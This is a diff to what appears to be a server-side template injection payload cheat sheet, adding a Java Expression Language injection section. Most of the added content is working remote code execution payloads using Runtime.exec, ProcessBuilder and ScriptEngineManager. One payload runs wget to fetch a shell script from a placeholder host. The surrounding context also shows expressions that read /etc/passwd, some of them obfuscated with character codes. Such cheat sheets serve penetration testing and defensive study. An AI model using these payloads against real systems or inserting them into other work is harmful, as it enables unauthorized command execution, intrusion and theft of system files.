@@ -14,6 +14,9 @@
   * [Basic injection](#basic-injection)
   * [Retrieve the system’s environment variables](retrieve-the-system-s-environment-variables)
   * [Retrieve /etc/passwd](#retrieve--etc-passwd)
+* [Expression Language EL](#expression-language-el)
+  * [Basic injection](#basic-injection)
+  * [Code execution](#code-execution)
 * [Twig](#twig)
   * [Basic injection](#basic-injection)
   * [Template format](#template-format)
@@ -133,6 +136,47 @@ ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 
 ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
 ```
+
+## Expression Language EL
+
+### Basic injection
+
+```java
+${1+1} 
+#{1+1}
+```
+
+### Code Execution
+
+
+```java
+// Common RCE payloads
+''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>)
+''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start()
+
+// Method using Runtime
+#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
+#{session.getAttribute("rtc").setAccessible(true)}
+#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
+
+// Method using processbuilder
+${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
+${request.getAttribute("c").add("cmd.exe")}
+${request.getAttribute("c").add("/k")}
+${request.getAttribute("c").add("ping x.x.x.x")}
+${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
+${request.getAttribute("a")}
+
+// Method using Reflection & Invoke
+${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}
+
+// Method using ScriptEngineManager one-liner
+${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}
+
+// Method using ScriptEngineManager
+${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}
+```
+
 
 ## Twig
 
@@ -464,3 +508,6 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 * [EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018](https://www.owasp.org/images/7/7e/Owasp_SSTI_final.pdf)
 * [Server Side Template Injection – on the example of Pebble - MICHAŁ BENTKOWSKI | September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
 * [Server-Side Template Injection (SSTI) in ASP.NET Razor - Clément Notin - 15 APR 2020](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/)
+* [Expression Language injection - PortSwigger](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
+* [Bean Stalking: Growing Java beans into RCE - July 7, 2020 - Github Security Lab](https://securitylab.github.com/research/bean-validation-RCE)
+* [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - 29/01/2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
